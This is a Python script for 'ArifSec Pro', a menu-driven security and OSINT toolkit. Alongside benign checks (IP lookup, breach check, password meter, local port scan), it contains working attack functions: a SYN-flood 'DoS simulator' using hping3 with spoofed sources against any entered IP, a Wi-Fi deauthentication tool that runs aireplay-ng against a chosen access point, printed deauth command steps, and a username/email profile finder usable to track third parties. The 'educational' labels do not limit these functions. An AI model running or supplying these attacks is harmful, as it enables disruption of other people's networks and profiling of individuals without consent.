#!/usr/bin/env python3
"""
ArifSec Pro - Personal Security & OSINT Toolkit
Created by Arif Ali
"""

import os
import sys
import socket
import hashlib
import re
import subprocess
import time
import json
import shutil
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple

# ---------- Color setup (fallback if colorama missing) ----------
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
    G = Fore.GREEN
    R = Fore.RED
    Y = Fore.YELLOW
    C = Fore.CYAN
    M = Fore.MAGENTA
    W = Fore.WHITE
    RESET = Style.RESET_ALL
except ImportError:
    COLORAMA_AVAILABLE = False
    G = R = Y = C = M = W = RESET = ""

# Will be updated after dependency checks
AXIRON_AVAILABLE = False
REQUESTS_AVAILABLE = False

# ---------- Helper to set colors after installation ----------
def set_colors():
    """Set global color variables after colorama is installed."""
    global G, R, Y, C, M, W, RESET, COLORAMA_AVAILABLE
    from colorama import init, Fore, Style
    init(autoreset=True)
    G = Fore.GREEN
    R = Fore.RED
    Y = Fore.YELLOW
    C = Fore.CYAN
    M = Fore.MAGENTA
    W = Fore.WHITE
    RESET = Style.RESET_ALL
    COLORAMA_AVAILABLE = True

# ---------- Dependency check & installation ----------
def check_python_package(package_name: str, import_name: str = None) -> bool:
    if import_name is None:
        import_name = package_name
    try:
        __import__(import_name)
        return True
    except ImportError:
        return False

def install_python_package(package_name: str) -> bool:
    print(f"{Y}Installing {package_name}...{RESET}")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", package_name], check=True)
        print(f"{G}Successfully installed {package_name}{RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{R}Failed to install {package_name}. Please install manually.{RESET}")
        return False

def check_system_tool(tool_name: str) -> bool:
    """Check if a system tool is available, searching common directories."""
    # First try standard PATH
    if shutil.which(tool_name) is not None:
        return True
    # Check in common sbin directories
    for path in ['/usr/sbin', '/sbin']:
        full_path = os.path.join(path, tool_name)
        if os.path.exists(full_path) and os.access(full_path, os.X_OK):
            return True
    return False

def get_tool_path(tool_name: str) -> str:
    """Return full path to a system tool if found, else just the name."""
    if shutil.which(tool_name) is not None:
        return shutil.which(tool_name)
    for path in ['/usr/sbin', '/sbin']:
        full_path = os.path.join(path, tool_name)
        if os.path.exists(full_path) and os.access(full_path, os.X_OK):
            return full_path
    return tool_name  # fallback, though check_system_tool should have returned False

def install_system_tool(tool_name: str, package_name: str = None) -> bool:
    if package_name is None:
        package_name = tool_name
    print(f"{Y}System tool '{tool_name}' is missing.{RESET}")
    answer = input(f"Attempt to install '{package_name}' using sudo apt? (y/n): ").strip().lower()
    if answer == 'y':
        try:
            subprocess.run(["sudo", "apt", "update"], check=True)
            subprocess.run(["sudo", "apt", "install", "-y", package_name], check=True)
            print(f"{G}Successfully installed {package_name}{RESET}")
            return True
        except subprocess.CalledProcessError:
            print(f"{R}Installation failed. Please install {package_name} manually.{RESET}")
    return False

def check_all_dependencies():
    """Ask user for permission to install missing packages/tools."""
    global REQUESTS_AVAILABLE, AXIRON_AVAILABLE, COLORAMA_AVAILABLE

    print(f"{C}Checking required dependencies...{RESET}\n")

    # requests
    if not check_python_package("requests"):
        print(f"{Y}Python package 'requests' is required.{RESET}")
        if input("Install it now? (y/n): ").strip().lower() == 'y':
            if install_python_package("requests"):
                REQUESTS_AVAILABLE = True
        else:
            print(f"{R}Warning: 'requests' not installed. Some features may not work.{RESET}")
    else:
        REQUESTS_AVAILABLE = True

    # colorama
    if not COLORAMA_AVAILABLE:
        print(f"{Y}Python package 'colorama' is required for colored output.{RESET}")
        if input("Install it now? (y/n): ").strip().lower() == 'y':
            if install_python_package("colorama"):
                set_colors()   # updates global color variables
        else:
            print(f"Continuing without colors.")

    # axiron (optional)
    if not check_python_package("axiron"):
        print(f"{Y}Optional: 'axiron' enables advanced social media search (recommended).{RESET}")
        if input("Install axiron now? (y/n): ").strip().lower() == 'y':
            if install_python_package("axiron"):
                AXIRON_AVAILABLE = True
    else:
        AXIRON_AVAILABLE = True

    # System tools (optional)
    if not check_system_tool("hcitool"):
        install_system_tool("hcitool", "bluez")
    if not check_system_tool("hping3"):
        install_system_tool("hping3", "hping3")
    if not check_system_tool("aircrack-ng"):
        install_system_tool("aircrack-ng", "aircrack-ng")

    print(f"{G}Dependency check complete.{RESET}\n")
    input("Press Enter to continue...")

# ---------- Helper Functions ----------
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_header(title):
    print("\n" + "=" * 60)
    print(f" {C}{title}{RESET}")
    print("=" * 60)

def print_main_banner():
    banner = f"""
{M}█████╗ {C}██████╗ {G}██╗{Y}███████╗{R}███████╗{C}███████╗{M} ██████╗ {RESET}
{M}██╔══██╗{C}██╔══██╗{G}██║{Y}██╔════╝{R}██╔════╝{C}██╔════╝{M}██╔════╝ {RESET}
{M}███████║{C}██████╔╝{G}██║{Y}█████╗  {R}█████╗  {C}█████╗  {M}██║      {RESET}
{M}██╔══██║{C}██╔══██╗{G}██║{Y}██╔══╝  {R}██╔══╝  {C}██╔══╝  {M}██║      {RESET}
{M}██║  ██║{C}██║  ██║{G}██║{Y}██║     {R}███████╗{C}██║     {M}╚██████╗ {RESET}
{M}╚═╝  ╚═╝{C}╚═╝  ╚═╝{G}╚═╝{Y}╚═╝     {R}╚══════╝{C}╚═╝      {M} ╚═════╝ {RESET}
               {C}Personal Security & OSINT Toolkit{RESET}
                      {Y}Created by Arif Ali{RESET}
"""
    print(banner)

def pause():
    input(f"\n{Y}Press Enter to continue...{RESET}")

# ---------- IP & Geolocation ----------
def get_public_ip():
    if not REQUESTS_AVAILABLE:
        return "Unavailable (requests missing)"
    try:
        import requests
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except:
        return "Unavailable"

def get_geolocation(ip):
    if not REQUESTS_AVAILABLE:
        return {"error": "requests module missing"}
    try:
        import requests
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return data
        else:
            return {"error": data.get("message", "Lookup failed")}
    except Exception as e:
        return {"error": str(e)}

def show_ip_info():
    clear_screen()
    print_header("IP ADDRESS & GEOLOCATION")
    ip = get_public_ip()
    print(f"Public IP: {ip}")
    if ip != "Unavailable":
        geo = get_geolocation(ip)
        if "error" not in geo:
            print(f"Country  : {geo.get('country', 'N/A')}")
            print(f"Region   : {geo.get('regionName', 'N/A')}")
            print(f"City     : {geo.get('city', 'N/A')}")
            print(f"ISP      : {geo.get('isp', 'N/A')}")
            print(f"Lat/Lon  : {geo.get('lat', 'N/A')}, {geo.get('lon', 'N/A')}")
        else:
            print(f"{R}Geolocation error: {geo['error']}{RESET}")
    pause()

# ---------- Email Breach Check ----------
def check_email_breach(email, api_key=None):
    if not REQUESTS_AVAILABLE:
        return {"error": "requests module missing"}
    if not api_key:
        return {"error": "No API key provided. Get one from haveibeenpwned.com"}
    import requests
    try:
        url = f"https://haveibeenpwned.com/api/v3/breach/{email}"
        headers = {"hibp-api-key": api_key, "hibp-client-id": "arifsec"}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            breaches = response.json()
            return {"breaches": breaches}
        elif response.status_code == 404:
            return {"breaches": []}
        else:
            return {"error": f"API error: {response.status_code}"}
    except Exception as e:
        return {"error": str(e)}

def email_breach_check():
    clear_screen()
    print_header("EMAIL BREACH CHECK")
    print("This feature checks if your email has appeared in known data breaches.")
    print("You'll need a free API key from haveibeenpwned.com.\n")
    api_key = input("Enter your HIBP API key (or press Enter to skip): ").strip()
    if not api_key:
        print("Skipping breach check.")
        pause()
        return
    email = input("Enter your email address: ").strip()
    if not email or '@' not in email:
        print(f"{R}Invalid email.{RESET}")
        pause()
        return
    print("\nChecking...")
    result = check_email_breach(email, api_key)
    if "error" in result:
        print(f"{R}Error: {result['error']}{RESET}")
    elif result["breaches"]:
        print(f"\n{R}⚠️  Your email was found in {len(result['breaches'])} breach(es):{RESET}")
        for breach in result["breaches"]:
            print(f"  - {breach.get('Name', 'Unknown')} ({breach.get('BreachDate', 'Unknown')})")
    else:
        print(f"\n{G}✅ Good news! No breaches found for this email.{RESET}")
    pause()

# ---------- Password Strength Meter ----------
def password_strength(password):
    score = 0
    feedback = []
    if len(password) >= 8:
        score += 1
    else:
        feedback.append("Use at least 8 characters.")
    if re.search(r'[A-Z]', password):
        score += 1
    else:
        feedback.append("Add uppercase letters.")
    if re.search(r'[a-z]', password):
        score += 1
    else:
        feedback.append("Add lowercase letters.")
    if re.search(r'[0-9]', password):
        score += 1
    else:
        feedback.append("Add numbers.")
    if re.search(r'[^A-Za-z0-9]', password):
        score += 1
    else:
        feedback.append("Add special characters.")
    if score >= 4:
        strength = "Strong"
    elif score >= 3:
        strength = "Medium"
    else:
        strength = "Weak"
    return strength, feedback

def password_checker():
    clear_screen()
    print_header("PASSWORD STRENGTH METER")
    print("Enter a password to check its strength (input hidden).")
    import getpass
    password = getpass.getpass("Password: ")
    strength, feedback = password_strength(password)
    if strength == "Strong":
        color = G
    elif strength == "Medium":
        color = Y
    else:
        color = R
    print(f"\nStrength: {color}{strength}{RESET}")
    if feedback:
        print("Suggestions:")
        for tip in feedback:
            print(f"  - {tip}")
    else:
        print("Excellent password!")
    pause()

# ---------- Local Port Scanner ----------
def scan_local_ports():
    clear_screen()
    print_header("LOCAL OPEN PORT SCANNER")
    print("Scanning common ports on your computer...\n")
    common_ports = {
        20: "FTP-data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC",
        139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS",
        995: "POP3S", 1723: "PPTP", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Alt"
    }
    open_ports = []
    for port, service in common_ports.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex(("127.0.0.1", port))
            if result == 0:
                open_ports.append((port, service))
            sock.close()
        except:
            pass
    if open_ports:
        print(f"{R}⚠️  The following ports are open on your local machine:{RESET}")
        for port, service in open_ports:
            print(f"  - Port {port} ({service})")
        print("\nIf you're not using these services, consider closing them for better security.")
    else:
        print(f"{G}✅ No common open ports found. Good!{RESET}")
    pause()

# ---------- DNS Leak Test ----------
def dns_leak_test():
    clear_screen()
    print_header("DNS LEAK TEST")
    print("This checks if your DNS queries are leaking to your ISP.\n")
    dns_servers = []
    try:
        with open("/etc/resolv.conf", "r") as f:
            for line in f:
                if line.startswith("nameserver"):
                    dns_servers.append(line.split()[1])
    except:
        dns_servers = ["Unable to read DNS config"]
    print("Your configured DNS servers:")
    for ns in dns_servers:
        print(f"  - {ns}")
    try:
        test_domain = "whoami.akamai.net"
        ip = socket.gethostbyname(test_domain)
        print(f"\nTest domain resolves to: {ip}")
        print("If this IP is not from a known public DNS (like 8.8.8.8, 1.1.1.1), it might be your ISP's DNS.")
        print("To be sure, use a tool like dnsleaktest.com in your browser.")
    except:
        print("Could not perform DNS test.")
    print("\nRecommendation: Use encrypted DNS (DNS over HTTPS) for privacy.")
    pause()

# ---------- Social Media Finder ----------
def setup_axiron_if_needed():
    global AXIRON_AVAILABLE
    if not AXIRON_AVAILABLE:
        print(f"{Y}The social media finder requires the 'axiron' library.{RESET}")
        if input("Install it now? (y/n): ").strip().lower() == 'y':
            if install_python_package("axiron"):
                try:
                    import axiron
                    AXIRON_AVAILABLE = True
                    return True
                except:
                    pass
        return False
    return True

def search_by_username():
    clear_screen()
    print_header("SOCIAL MEDIA FINDER - BY USERNAME")
    if not setup_axiron_if_needed():
        pause()
        return
    username = input(f"{Y}Enter username to search: {RESET}").strip()
    if not username:
        print(f"{R}No username entered.{RESET}")
        pause()
        return
    print(f"\n🔍 {C}Searching for '{username}' across 700+ platforms...{RESET}")
    import axiron
    try:
        results = axiron.OsiAxi(username)
        if results and len(results) > 0:
            priority = ["instagram", "linkedin", "facebook", "tiktok", "twitter", "x", "skype", "snapchat", "google", "microsoft"]
            priority_results = []
            other_results = []
            for account in results:
                plat = account.get('platform', '').lower()
                if any(p in plat for p in priority):
                    priority_results.append(account)
                else:
                    other_results.append(account)
            sorted_results = priority_results + other_results
            print(f"{G}✅ Found {len(sorted_results)} profile(s):{RESET}\n")
            for i, account in enumerate(sorted_results[:30]):
                plat = account.get('platform', 'Unknown')
                link = account.get('link', 'No link')
                if any(p in plat.lower() for p in priority):
                    print(f"{G}[{i+1}] {plat}: {link}{RESET}")
                else:
                    print(f"{W}[{i+1}] {plat}: {link}{RESET}")
            if len(sorted_results) > 30:
                print(f"\n... and {len(sorted_results) - 30} more profiles.")
            if input(f"\n{Y}Save all results to file? (y/n): {RESET}").strip().lower() == 'y':
                filename = f"social_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Social media profiles for username: {username}\n")
                    f.write(f"Found: {len(sorted_results)} profiles\n\n")
                    for acc in sorted_results:
                        f.write(f"{acc.get('platform', 'Unknown')}: {acc.get('link', 'No link')}\n")
                print(f"{G}✅ Saved to {filename}{RESET}")
        else:
            print(f"{R}❌ No profiles found for this username.{RESET}")
    except Exception as e:
        print(f"{R}Error during search: {str(e)}{RESET}")
    pause()

def search_by_email():
    clear_screen()
    print_header("SOCIAL MEDIA FINDER - BY EMAIL")
    if not setup_axiron_if_needed():
        pause()
        return
    email = input("Enter email address to check: ").strip()
    if not email or '@' not in email:
        print(f"{R}Invalid email format.{RESET}")
        pause()
        return
    print(f"\n🔍 Checking '{email}'...")
    import axiron
    username = email.split('@')[0]
    print(f"\nChecking email username '{username}' across platforms...")
    try:
        results = axiron.OsiAxi(username)
        if results:
            print(f"\n{G}✅ Found {len(results)} profile(s) matching the username part:{RESET}")
            for i, account in enumerate(results[:10]):
                print(f"  {account.get('platform', 'Unknown')}: {account.get('link', 'No link')}")
            print("\n🔐 Checking for email leaks...")
            leak = axiron.EmailAxi(email)
            if leak.get("status") == "leaked":
                print(f"{R}⚠️  Email found in {leak.get('count', 'unknown')} breach(es){RESET}")
                if leak.get("sources"):
                    print(f"Sources: {', '.join(leak['sources'][:3])}")
            else:
                print(f"{G}✅ Email not found in known leaks.{RESET}")
        else:
            print(f"{R}❌ No profiles found.{RESET}")
    except Exception as e:
        print(f"{R}Error: {str(e)}{RESET}")
    pause()

def social_media_finder_menu():
    while True:
        clear_screen()
        print_header("SOCIAL MEDIA FINDER")
        print("Find online profiles by username or email")
        print("\n1. Search by Username (recommended)")
        print("2. Search by Email")
        print("3. Back to Main Menu")
        choice = input("\nEnter your choice (1-3): ").strip()
        if choice == "1":
            search_by_username()
        elif choice == "2":
            search_by_email()
        elif choice == "3":
            break
        else:
            print(f"{R}Invalid choice.{RESET}")
            pause()

# ---------- Bluetooth Scanner ----------
def bluetooth_scanner():
    clear_screen()
    print_header("BLUETOOTH DEVICE SCANNER")
    if not check_system_tool("hcitool"):
        print(f"{R}Tool 'hcitool' not available. Install bluez.{RESET}")
        pause()
        return
    print(f"{Y}This will scan for nearby Bluetooth devices.{RESET}\n")
    if input("Proceed with scan? (y/n): ").strip().lower() != 'y':
        return
    print(f"\n{C}Scanning for Bluetooth devices...{RESET}")
    try:
        result = subprocess.run(['hcitool', 'scan'], capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                print(f"{G}Found devices:{RESET}")
                for line in lines[1:]:
                    print(f"  {G}{line}{RESET}")
            else:
                print(f"{Y}No Bluetooth devices found.{RESET}")
        else:
            print(f"{R}Error running hcitool.{RESET}")
    except subprocess.TimeoutExpired:
        print(f"{R}Scan timed out.{RESET}")
    except Exception as e:
        print(f"{R}Error: {str(e)}{RESET}")
    pause()

# ---------- DoS Attack Simulator ----------
def dos_attack_simulator():
    clear_screen()
    print_header("DoS ATTACK SIMULATOR (EDUCATIONAL)")
    print(f"{R}⚠️  WARNING: Use only on your own devices or with explicit permission!{RESET}")
    if not check_system_tool("hping3"):
        print(f"{R}Tool 'hping3' not available.{RESET}")
        pause()
        return
    target = input("Enter target IP address: ").strip()
    if not target:
        print(f"{R}No target entered.{RESET}")
        pause()
        return
    try:
        port = int(input("Enter target port (e.g., 80): ").strip())
    except ValueError:
        print(f"{R}Invalid port.{RESET}")
        pause()
        return
    print(f"\n{Y}This attack will send a limited number of packets (100).{RESET}")
    if input("Type 'YES' to proceed: ").strip() != "YES":
        print("Aborted.")
        pause()
        return
    print(f"\n{C}Starting simulated DoS attack on {target}:{port}...{RESET}")
    try:
        cmd = ['hping3', '-S', '-p', str(port), '--flood', '--rand-source', '-c', '100', target]
        subprocess.run(cmd, timeout=10)
        print(f"{G}Attack completed.{RESET}")
    except subprocess.TimeoutExpired:
        print(f"{Y}Attack finished (timeout).{RESET}")
    except Exception as e:
        print(f"{R}Error: {str(e)}{RESET}")
    pause()

# ---------- Wi-Fi Deauth Helper (instructions only) ----------
def wifi_deauth_helper():
    clear_screen()
    print_header("WI-FI DEAUTH ATTACK HELPER")
    print(f"{R}⚠️  WARNING: This is for educational purposes only!{RESET}")
    if not check_system_tool("aircrack-ng"):
        print(f"{R}Tool 'aircrack-ng' not available.{RESET}")
        pause()
        return
    print("\nSteps to perform a deauth attack:")
    print("1. Put your Wi-Fi interface into monitor mode:")
    print(f"   {C}sudo airmon-ng start wlan0{RESET}")
    print("2. Scan for networks:")
    print(f"   {C}sudo airodump-ng wlan0mon{RESET}")
    print("3. Note the BSSID and channel of your target.")
    print("4. Launch deauth attack:")
    print(f"   {C}sudo aireplay-ng -0 5 -a <BSSID> -c <client MAC> wlan0mon{RESET}")
    print("\nThis tool does not automate the attack – it provides guidance.")
    pause()

# ---------- Wi-Fi Deauth Attack Tool (educational) ----------
def wifi_deauth_attack():
    clear_screen()
    print_header("WI-FI DEAUTH ATTACK TOOL (EDUCATIONAL)")
    print(f"{R}⚠️  WARNING: Use only on your own network or with explicit permission!{RESET}")
    print(f"{R}This attack can disrupt Wi-Fi service. It is illegal on networks you do not own.{RESET}\n")

    if not check_system_tool("aireplay-ng"):
        print(f"{R}Tool 'aireplay-ng' not available. Install aircrack-ng.{RESET}")
        pause()
        return

    # Check if running as root (recommended)
    if os.geteuid() != 0:
        print(f"{Y}Note: This tool works best with root privileges. Run with 'sudo' if you encounter errors.{RESET}\n")

    # Gather parameters
    interface = input("Enter your wireless interface in monitor mode (e.g., wlan0mon): ").strip()
    if not interface:
        print(f"{R}No interface entered.{RESET}")
        pause()
        return

    bssid = input("Enter target AP BSSID (MAC address, e.g., AA:BB:CC:DD:EE:FF): ").strip()
    if not bssid:
        print(f"{R}No BSSID entered.{RESET}")
        pause()
        return

    client = input("Enter client MAC to deauth (optional, press Enter to broadcast): ").strip()
    if not client:
        client = None

    try:
        count = int(input("Number of deauth packets to send (default 10): ").strip() or "10")
    except ValueError:
        print(f"{R}Invalid number. Using 10.{RESET}")
        count = 10

    print(f"\n{Y}You are about to send {count} deauth packets to {bssid} on interface {interface}.{RESET}")
    if client:
        print(f"Targeting client: {client}")
    else:
        print("Targeting all clients (broadcast).")

    confirm = input(f"{R}Type 'YES' to launch attack: {RESET}").strip()
    if confirm != "YES":
        print("Attack aborted.")
        pause()
        return

    # Get full path to aireplay-ng
    aireplay_path = get_tool_path("aireplay-ng")
    # Build command
    cmd = ["sudo", aireplay_path, "-0", str(count), "-a", bssid, interface]
    if client:
        cmd.extend(["-c", client])

    print(f"\n{C}Executing: {' '.join(cmd)}{RESET}")
    try:
        subprocess.run(cmd, check=True)
        print(f"{G}Attack completed.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{R}Error executing aireplay-ng: {e}{RESET}")
    except Exception as e:
        print(f"{R}Unexpected error: {str(e)}{RESET}")

    pause()

# ---------- Generate Report ----------
def generate_report():
    clear_screen()
    print_header("GENERATE SECURITY REPORT")
    report = []
    report.append("ARIFSEC PRO SECURITY REPORT")
    report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report.append("")
    ip = get_public_ip()
    report.append(f"Public IP: {ip}")
    if ip != "Unavailable":
        geo = get_geolocation(ip)
        if "error" not in geo:
            report.append(f"Location: {geo.get('city', 'N/A')}, {geo.get('regionName', 'N/A')}, {geo.get('country', 'N/A')}")
            report.append(f"ISP: {geo.get('isp', 'N/A')}")
    report.append("")
    common_ports = {
        20: "FTP-data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC",
        139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS",
        995: "POP3S", 1723: "PPTP", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Alt"
    }
    open_ports = []
    for port, service in common_ports.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex(("127.0.0.1", port))
            if result == 0:
                open_ports.append((port, service))
            sock.close()
        except:
            pass
    if open_ports:
        report.append("Open Local Ports:")
        for port, service in open_ports:
            report.append(f"  - {port} ({service})")
    else:
        report.append("No open common ports found.")
    report.append("")
    try:
        with open("/etc/resolv.conf", "r") as f:
            dns_servers = [line.split()[1] for line in f if line.startswith("nameserver")]
        report.append("DNS Servers:")
        for ns in dns_servers:
            report.append(f"  - {ns}")
    except:
        report.append("Could not read DNS configuration.")
    filename = f"arifsec_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, "w") as f:
        f.write("\n".join(report))
    print(f"{G}Report saved to {filename}{RESET}")
    print("\n" + "\n".join(report))
    pause()

# ---------- Main Menu ----------
def main():
    check_all_dependencies()
    while True:
        clear_screen()
        print_main_banner()
        print("\n" + "=" * 60)
        print(" MAIN MENU")
        print("=" * 60)
        print("1.  Check IP & Geolocation")
        print("2.  Email Breach Check (requires HIBP API key)")
        print("3.  Password Strength Meter")
        print("4.  Scan Local Open Ports")
        print("5.  DNS Leak Test")
        print("6.  Generate Full Security Report")
        print("7.  🔍 Social Media Finder")
        print("8.  📱 Bluetooth Scanner")
        print("9.  💣 DoS Attack Simulator (Educational)")
        print("10. 📡 Wi-Fi Deauth Helper (Instructions)")
        print("11. 🚫 Wi-Fi Deauth Attack (Educational)")
        print("0.  Exit")
        choice = input("\nEnter your choice (0-11): ").strip()
        if choice == "1":
            show_ip_info()
        elif choice == "2":
            email_breach_check()
        elif choice == "3":
            password_checker()
        elif choice == "4":
            scan_local_ports()
        elif choice == "5":
            dns_leak_test()
        elif choice == "6":
            generate_report()
        elif choice == "7":
            social_media_finder_menu()
        elif choice == "8":
            bluetooth_scanner()
        elif choice == "9":
            dos_attack_simulator()
        elif choice == "10":
            wifi_deauth_helper()
        elif choice == "11":
            wifi_deauth_attack()
        elif choice == "0":
            print(f"\n{G}Stay safe! Goodbye.{RESET}")
            sys.exit(0)
        else:
            print(f"{R}Invalid choice.{RESET}")
            pause()

if __name__ == "__main__":
    main()